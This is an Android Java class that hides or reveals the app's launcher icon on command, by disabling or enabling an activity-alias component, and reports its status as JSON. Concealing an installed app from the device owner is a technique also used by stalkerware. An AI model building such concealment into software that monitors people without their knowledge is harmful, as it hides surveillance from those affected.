package com.fason.app.features.apps;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;

import com.fason.app.core.FasonApp;
import com.fason.app.core.Protocol;

import org.json.JSONObject;

public final class FasonManager {

    private FasonManager() {}

    public static JSONObject handle(String action) {
        if (action == null || action.isEmpty()) return status();

        switch (action) {
            case Protocol.ACT_HIDE: return hide();
            case Protocol.ACT_SHOW:
            case Protocol.ACT_UNHIDE: return show();
            case Protocol.ACT_STATUS: return status();
            default: return errorResult("Unknown action: " + action);
        }
    }

    private static ComponentName getAliasComponent(Context ctx) {
        return new ComponentName(ctx, ctx.getPackageName() + Protocol.ALIAS_SUFFIX);
    }

    private static boolean isHidden(Context ctx) {
        try {
            int state = ctx.getPackageManager().getComponentEnabledSetting(getAliasComponent(ctx));
            return state == PackageManager.COMPONENT_ENABLED_STATE_DISABLED ||
                   state == PackageManager.COMPONENT_ENABLED_STATE_DISABLED_USER;
        } catch (Exception e) {
            return false;
        }
    }

    private static JSONObject hide() {
        JSONObject result = new JSONObject();
        try {
            Context ctx = FasonApp.getContext();

            if (isHidden(ctx)) {
                result.put(Protocol.KEY_SUCCESS, true);
                result.put(Protocol.KEY_ACTION, Protocol.ACT_HIDE);
                result.put(Protocol.KEY_HIDDEN, true);
                result.put(Protocol.KEY_MESSAGE, "Already hidden");
                return result;
            }

            boolean success = applyState(ctx, PackageManager.COMPONENT_ENABLED_STATE_DISABLED);

            result.put(Protocol.KEY_SUCCESS, success);
            result.put(Protocol.KEY_ACTION, Protocol.ACT_HIDE);
            result.put(Protocol.KEY_HIDDEN, success);
            result.put(Protocol.KEY_MESSAGE, success ? "Hidden from launcher" : "Failed to hide");
        } catch (Exception e) {
            fillError(result, e);
        }
        return result;
    }

    private static JSONObject show() {
        JSONObject result = new JSONObject();
        try {
            Context ctx = FasonApp.getContext();

            if (!isHidden(ctx)) {
                result.put(Protocol.KEY_SUCCESS, true);
                result.put(Protocol.KEY_ACTION, Protocol.ACT_SHOW);
                result.put(Protocol.KEY_HIDDEN, false);
                result.put(Protocol.KEY_MESSAGE, "Already visible");
                return result;
            }

            boolean success = applyState(ctx, PackageManager.COMPONENT_ENABLED_STATE_ENABLED);

            result.put(Protocol.KEY_SUCCESS, success);
            result.put(Protocol.KEY_ACTION, Protocol.ACT_SHOW);
            result.put(Protocol.KEY_HIDDEN, !success);
            result.put(Protocol.KEY_MESSAGE, success ? "Visible in launcher" : "Failed to show");
        } catch (Exception e) {
            fillError(result, e);
        }
        return result;
    }

    // SYNCHRONOUS flag on Android 14+ guarantees immediate state change
    private static boolean applyState(Context ctx, int targetState) {
        try {
            PackageManager pm = ctx.getPackageManager();
            ComponentName comp = getAliasComponent(ctx);

            int flags = PackageManager.DONT_KILL_APP;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                flags |= PackageManager.SYNCHRONOUS;
            }

            pm.setComponentEnabledSetting(comp, targetState, flags);
            notifyLauncher(ctx);
            return true;
        } catch (Exception e) {
            return false;
        }
    }

    private static void notifyLauncher(Context ctx) {
        try {
            Intent intent = new Intent(Intent.ACTION_PACKAGE_CHANGED);
            intent.setData(Uri.parse("package:" + ctx.getPackageName()));
            intent.putExtra(Intent.EXTRA_CHANGED_COMPONENT_NAME,
                ctx.getPackageName() + Protocol.ALIAS_SUFFIX);
            intent.putExtra(Intent.EXTRA_UID, ctx.getApplicationInfo().uid);
            ctx.sendBroadcast(intent);
        } catch (Exception ignored) {}
    }

    private static JSONObject status() {
        JSONObject result = new JSONObject();
        try {
            Context ctx = FasonApp.getContext();
            int state = ctx.getPackageManager().getComponentEnabledSetting(getAliasComponent(ctx));

            boolean hidden = state == PackageManager.COMPONENT_ENABLED_STATE_DISABLED ||
                             state == PackageManager.COMPONENT_ENABLED_STATE_DISABLED_USER;

            result.put(Protocol.KEY_SUCCESS, true);
            result.put(Protocol.KEY_HIDDEN, hidden);
            result.put(Protocol.KEY_STATE, state);
            result.put(Protocol.KEY_STATUS, hidden ? "hidden" : "visible");
        } catch (Exception e) {
            fillError(result, e);
        }
        return result;
    }

    private static JSONObject errorResult(String message) {
        JSONObject r = new JSONObject();
        try { r.put(Protocol.KEY_SUCCESS, false); r.put(Protocol.KEY_ERROR, message); } catch (Exception ignored) {}
        return r;
    }

    private static void fillError(JSONObject result, Exception e) {
        try { result.put(Protocol.KEY_SUCCESS, false); result.put(Protocol.KEY_ERROR, e.getMessage()); } catch (Exception ignored) {}
    }
}
